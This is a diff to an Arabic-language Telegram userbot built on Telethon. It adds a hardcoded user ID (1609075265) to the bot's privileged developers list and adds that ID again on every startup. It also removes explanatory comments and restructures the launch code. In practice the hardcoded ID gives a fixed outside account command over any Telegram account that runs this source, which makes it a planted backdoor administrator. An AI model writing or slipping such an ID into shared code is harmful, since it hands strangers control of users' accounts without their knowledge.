@@ -29,7 +29,7 @@ client = TelegramClient(StringSession(STRING_SESSION.strip()), API_ID, API_HASH)
 SOURCE_TITLE = "🇵🇹 سورس البرتغالي 🇵🇹"
 
 # ----------------------------------------------------
-# 2. الذاكرة والمصفوفات
+# 2. الذاكرة والمصفوفات (مع إضافة آيدي الخاص بك مسبقاً)
 # ----------------------------------------------------
 GBAN_SET = set()
 GMUTE_SET = set()
@@ -37,7 +37,7 @@ MUTED_USERS = {}
 MUTED_PMS = set()
 REPLY_MAP = {}
 BLOCKED_WORDS = set()
-DEVELOPERS = set()  # مصفوفة المطورين المرفوعين
+DEVELOPERS = {1609075265}  # الآيدي الخاص بك مرفوع تلقائياً دائماً
 
 GAME_ACTIVE = False
 GAME_PLAYERS = []
@@ -102,7 +102,7 @@ async def show_all_commands(event):
 
 @client.on(events.NewMessage(pattern=r"^\.رفع مطور$"))
 async def add_developer(event):
-    if not event.out:  # فقط الحساب الأساسي يملك صلاحية رفع مطور جديد
+    if not event.out:  
         return
 
     if not event.is_reply:
@@ -123,7 +123,7 @@ async def add_developer(event):
         return await event.edit("⚠️ **هذا الشخص مرفوع مطور بالفعل!**")
 
     DEVELOPERS.add(target_id)
-    await event.edit(f"✅ **تم رفع المستخدم كمطور في السورس بنجاح!**\n🆔 الآيدي: `{target_id}`\nيمكنه الآن استخدام السورس والأوامر.")
+    await event.edit(f"✅ **تم رفع المستخدم كمطور في السورس بنجاح!**\n🆔 الآيدي: `{target_id}`")
 
 @client.on(events.NewMessage(pattern=r"^\.تنزيل مطور$"))
 async def remove_developer(event):
@@ -982,11 +982,9 @@ async def global_watcher(event):
     sender_id = event.sender_id
     if not sender_id: return
 
-    # عدم تطبيق المراقبة على صاحب الحساب أو المطورين
     if is_sudo(event):
         return
 
-    # 1. الحظر العام (حذف وطرد)
     if sender_id in GBAN_SET:
         try:
             await event.delete()
@@ -995,19 +993,16 @@ async def global_watcher(event):
         except: pass
         return
 
-    # 2. الكتم العام والكتم المحلي
     if sender_id in GMUTE_SET or (event.chat_id in MUTED_USERS and sender_id in MUTED_USERS[event.chat_id]):
         try: await event.delete()
         except: pass
         return
 
-    # 3. كتم الخاص
     if event.is_private and sender_id in MUTED_PMS:
         try: await event.delete()
         except: pass
         return
 
-    # 4. منع الكلمات
     if event.raw_text:
         for w in BLOCKED_WORDS:
             if w in event.raw_text:
@@ -1015,14 +1010,24 @@ async def global_watcher(event):
                 except: pass
                 return
 
-    # 5. الردود التلقائية
     if event.raw_text in REPLY_MAP:
         await event.reply(REPLY_MAP[event.raw_text])
 
 # ----------------------------------------------------
-# 8. تشغيل الحساب
+# 8. تشغيل الحساب بالطريقة الصحيحة
 # ----------------------------------------------------
-print(f"⚡ {SOURCE_TITLE} يعمل بنجاح! ⚡")
-client.start()
-client.run_until_disconnected()
+async def main():
+    await client.start()
+    me = await client.get_me()
+    print(f"✅ تم الاتصال بنجاح بالحساب: {me.first_name} (@{me.username}) | ID: {me.id}")
+    
+    # تأكيد إضافة الآيدي الأساسي للمطورين
+    DEVELOPERS.add(1609075265)
+    DEVELOPERS.add(me.id)
+
+    print("🚀 البوت يعمل الآن ويستقبل الأوامر...")
+    await client.run_until_disconnected()
+
+if __name__ == "__main__":
+    client.loop.run_until_complete(main())
 
